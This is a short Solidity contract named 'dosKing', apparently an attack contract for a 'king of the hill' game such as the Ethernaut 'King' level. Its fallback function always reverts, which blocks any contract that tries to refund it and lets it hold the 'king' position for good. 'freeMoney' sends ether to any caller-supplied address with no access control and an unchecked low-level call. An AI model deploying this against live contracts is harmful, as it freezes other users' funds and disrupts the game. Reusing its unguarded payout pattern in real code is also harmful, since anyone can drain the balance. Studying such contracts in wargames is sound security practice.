pragma solidity ^0.4.18;

contract dosKing {

    function dosKing() public payable{}

    function freeMoney(address param) public {
        param.call.value(1.001 ether)();
    }
    function myBalance() public view returns(uint) {
        return address(this).balance;
    }
    function refill() public payable {
    }
    function () public {
        revert();
    }
}